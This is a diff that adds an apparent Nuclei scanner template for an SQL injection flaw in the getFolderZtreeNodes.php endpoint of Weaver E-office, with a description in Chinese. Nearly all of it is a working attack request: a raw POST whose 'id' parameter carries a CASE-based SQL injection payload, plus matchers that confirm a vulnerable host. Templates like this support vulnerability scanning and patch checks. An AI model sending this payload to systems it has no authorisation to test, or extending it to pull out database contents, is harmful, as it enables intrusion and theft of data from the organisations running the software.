@@ -1,0 +1,25 @@
+id: weaver-e-office-getfolderztreenodes-sql
+
+info:
+  name: "泛微E-office getFolderZtreeNodes.php 接口 SQL 注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    泛微E-office平台的getFolderZtreeNodes.php接口存在SQL注入漏洞，允许攻击者通过构造恶意输入执行非授权的数据库查询，从而泄露敏感数据。
+  tags: 泛微
+
+http:
+- raw:
+  - |
+    POST /general/system/file_folder/purview_new/getFolderZtreeNodes.php HTTP/1.1
+    Host: {{Hostname}}
+
+    id=(SELECT (CASE WHEN (length(database())>0) THEN 1 ELSE (SELECT 9469 UNION SELECT 1668) END))&lv=0&n=&param=eyJmaWxlU29ydCI6bnVsbCwicm9vdCI6eyJuYW1lIjpudWxsLCJjaGVjayI6dHJ1ZSwidXJsIjoiL2dlbmVyYWwvZmlsZV9mb2xkZXIvZmlsZV9uZXcvZmlsZWxpc3QucGhwP1NPUlRfSUQ9MCZGSUxFX1NPUlQ9IiwidGFyZ2V0IjoiZmlsZV9tYWluIiwicmlnaHRDbGljayI6ZmFsc2V9LCJub2RlIjp7InJpZ2h0Q2xpY2siOmZhbHNlLCJ1cmwiOiIvZ2VuZXJhbC9maWxlX2ZvbGRlci9maWxlX25ldy9maWxlbGlzdC5waHAiLCJ0YXJnZXQiOiJmaWxlX21haW4iLCJsb2FkQWxsIjpmYWxzZX0sInNlbGVjdCI6eyJzb3J0aWQiOm51bGwsInNvcnRuYW1lIjpudWxsLCJnZXR3aGF0IjpudWxsLCJmaWxlc29ydCI6bnVsbCwiY2xpY2tGdW4iOiJzZWxlY3RfZm9sZGVyIn19
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [302]
+  - type: word
+    part: body
+    words:
+    - 'folder.class.php'
